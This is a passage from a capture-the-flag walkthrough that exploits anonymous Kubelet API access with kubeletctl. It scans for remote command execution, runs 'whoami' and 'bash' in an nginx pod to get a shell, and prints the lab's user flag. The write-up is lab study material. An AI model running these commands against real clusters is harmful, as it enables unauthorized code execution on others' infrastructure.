We already know that Nginx only exists in the default namespace and is not a Kubernetes system pod. Since Kubelet allows anonymous access, it is possible to execute commands through its available functionalities; however, Curl cannot be used because it relies on WebSocket connections. To verify whether command execution is possible on any pod, we can use the scan rce option provided by kubeletctl.
```bash
$ kubeletctl -s 10.10.11.133 scan rce
```
scan → instructs the tool to perform a scan.

rce → checks for remote command execution capabilities on pods.

![alt text](Images/Kubeletctl2.png)

The result indicates that commands can be executed on the Nginx pod. Let's see whether we can run id within Nginx.
```bash
$ kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "whoami"
```
-p → name of the POD 

-c → name of the Container

exec “whoami” → command to execute.

![alt text](Images/Kubeletctl3.png)

We can try to execute “bash”
```bash
$  kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "bash"
```
![alt text](Images/Kubeletctl4.png)

Now we got a shell, so we try to get a user flag because we are in a docker not in the main machine (our machine is 10.10.11.133).

![alt text](Images/UserFlag.png)
```bash
User Flag → 3937b149d624c56859cdeadf4736cce6
```


[Back](README.md)